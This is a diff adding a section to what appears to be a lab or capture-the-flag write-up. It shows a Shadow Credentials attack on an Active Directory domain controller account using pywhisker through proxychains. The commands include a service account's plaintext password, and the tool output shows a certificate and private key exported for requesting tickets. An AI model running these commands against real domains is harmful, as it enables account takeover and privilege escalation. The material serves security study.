@@ -1495,3 +1495,43 @@ Reachable High Value Targets	19
 ```
 ![](/assets/post_img/2023-11-05%20060809_svc_backup_Reachable_High_Value_Targets.png)
 
+AddKeyCredentialLink
+
+https://cyberstoph.org/posts/2022/03/detecting-shadow-credentials/
+```bash
+add /etc/hosts
+172.16.21.222 eu.junon.vl
+
+proxychains4 -q python3 pywhisker.py -d "eu.junon.vl" -u "svc_backup" -p 'b4ckup5821!' --target "S021M200$" --action "list"
+[*] Searching for the target account
+[*] Target user found: CN=S021M200,OU=Domain Controllers,DC=eu,DC=junon,DC=vl
+[*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute
+
+
+proxychains4 -q python3 pywhisker.py -d "eu.junon.vl" -u "svc_backup" -p 'b4ckup5821!' --target "S021M200$" --action "add" --filename key --export PEM
+[*] Searching for the target account
+[*] Target user found: CN=S021M200,OU=Domain Controllers,DC=eu,DC=junon,DC=vl
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: d01d789b-996f-49fb-c091-9828e73805f0
+[*] Updating the msDS-KeyCredentialLink attribute of S021M200$
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PEM certificate at path: key_cert.pem
+[+] Saved PEM private key at path: key_priv.pem
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+
+
+proxychains4 -q python3 pywhisker.py -d "eu.junon.vl" -u "svc_backup" -p 'b4ckup5821!' --target "S021M200$" --action "list"
+[*] Searching for the target account
+[*] Target user found: CN=S021M200,OU=Domain Controllers,DC=eu,DC=junon,DC=vl
+[*] Listing devices for S021M200$
+[*] DeviceID: d01d789b-996f-49fb-c091-9828e73805f0 | Creation Time (UTC): 2023-11-04 22:23:41.975300
+```
+
+https://github.com/dirkjanm/PKINITtools
+
+```bash
+
+```
+
